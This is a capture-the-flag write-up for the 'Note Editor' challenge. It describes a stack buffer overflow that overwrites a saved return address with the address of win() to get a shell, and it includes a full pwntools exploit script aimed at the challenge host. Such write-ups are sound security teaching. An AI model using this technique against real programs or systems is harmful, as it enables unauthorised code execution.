---
title: "Note Editor"
date: 2025-06-22
description: Stack buffer overflow in a note editor binary, overflowing the allocated byte budget to overwrite the return address with the address of a win() function.
challenge_author: "Not specified"
writeup_author: "sleepyswords & wallsdeep13"
---

**Challenge:** Note Editor

**Goal:** Exploit a memory corruption flaw in a C note-management binary to redirect execution flow and spawn an interactive shell.

**Flag:**
- `GPNCTF{...}` - retrieved by running `cat /flag` from the spawned shell

---

## Vulnerability

Reverse engineering the binary and its companion library (`lib.c`) reveals a hidden `win()` function designed to execute `/bin/sh`.

The note editor allows users to append text to an in-memory note buffer up to an initial budget of 1024 bytes. However, when appending text, boundary checks on total length are improperly validated. By sending consecutive append commands, an attacker can exceed the allocated stack buffer and overwrite adjacent memory on the stack, including the saved base pointer (`rbp`) and return address (`rip`) at offset `1064`.

Using the `edit` functionality, we can place a precise 8-byte pointer targeting `win()` directly into the saved return address slot.

## Attack Path

### 1. Locate the win() Memory Address

We inspect the binary symbols using `nm` or `objdump`:

```bash
nm ./note_editor | grep win
```

This reveals the virtual memory address of `win()`.

### 2. Craft the Buffer Overflow

1. Send an initial append payload with fewer than 1024 bytes.
2. Send subsequent padding bytes to fill the buffer up to offset 1064.
3. Use the `edit` feature at offset 1064 to write the 8-byte address of `win()`.

### 3. Automate with Pwntools

Because the payload requires sending non-printable raw memory bytes, we script the interaction using Python's `pwntools`:

```python
from pwn import *

# Set target binary context
elf = ELF('./note_editor')
p = remote('note-editor.chal.gpnctf.com', 1337)

win_addr = elf.symbols['win']

# 1. Fill initial buffer
p.sendlineafter(b'> ', b'append')
p.sendlineafter(b'bytes: ', b'A' * 1000)

# 2. Overflow to reach saved return address at offset 1064
p.sendlineafter(b'> ', b'append')
p.sendlineafter(b'bytes: ', b'B' * 64)

# 3. Overwrite return address with win()
p.sendlineafter(b'> ', b'edit')
p.sendlineafter(b'offset: ', b'1064')
p.sendafter(b'data: ', p64(win_addr))

# 4. Trigger return by quitting
p.sendlineafter(b'> ', b'quit')

# Interactive shell
p.interactive()
```

### 4. Read the Flag

Once the binary returns from `main`, control jumps to `win()`, giving us a shell:

```bash
$ cat /flag
GPNCTF{...}
```

---

## Notes

- Compile binaries with standard stack protection mechanisms (`-fstack-protector-all`, `-Wl,-z,relro,-z,now`) and ensure strict boundary checking on all buffer accumulation functions.
